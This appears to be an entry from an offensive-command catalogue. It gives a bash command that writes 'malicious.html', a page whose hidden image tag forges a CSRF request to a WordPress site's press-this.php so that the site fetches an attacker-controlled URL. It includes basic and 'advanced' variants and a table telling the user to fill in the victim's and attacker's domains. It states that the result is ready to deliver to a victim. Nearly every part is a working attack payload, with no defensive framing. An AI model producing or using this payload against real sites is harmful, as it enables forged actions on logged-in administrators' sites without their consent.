---
id: cmd-create-csrf-html-187520
data: >-
  cat > malicious.html << EOF

  <!DOCTYPE html><html><body><img
  src="//target.com/wp-admin/press-this.php?u=http://attacker.com&url-scan-submit=Scan"
  style="display:none;"></body></html>

  EOF
tags:
  - csrf
  - html
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:31:30.692Z'
verified: false
validated: true
submitted: true
---
# create-csrf-html-payload

## Command

```bash
cat > malicious.html << EOF
<!DOCTYPE html><html><body><img src="//target.com/wp-admin/press-this.php?u=http://attacker.com&url-scan-submit=Scan" style="display:none;"></body></html>
EOF
```

## Description

This command generates a malicious HTML file using a hidden <img> tag to trigger a CSRF request to WordPress Press This when loaded in the victim's browser.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| target.com | Replace with victim WordPress domain | Yes |
| attacker.com | Replace with attacker's domain for scrape | Yes |

## Examples

### Basic Usage

```bash
cat > malicious.html << EOF
<!DOCTYPE html><html><body><img src="//example.com/wp-admin/press-this.php?u=http://evil.com&url-scan-submit=Scan" style="display:none;"></body></html>
EOF
```

### Advanced Usage

```bash
# With onload to force load
cat > malicious.html << EOF
<!DOCTYPE html><html><body><img src="//target.com/wp-admin/press-this.php?u=http://attacker.com&url-scan-submit=Scan" onload="this.src=this.src" style="display:none;"></body></html>
EOF
```

## Expected Output

Creates 'malicious.html' file containing the payload, ready to be hosted and delivered to the victim.

## Related

- [[Related Procedure: Deliver-CSRF-Payload-via-Malicious-HTML]]
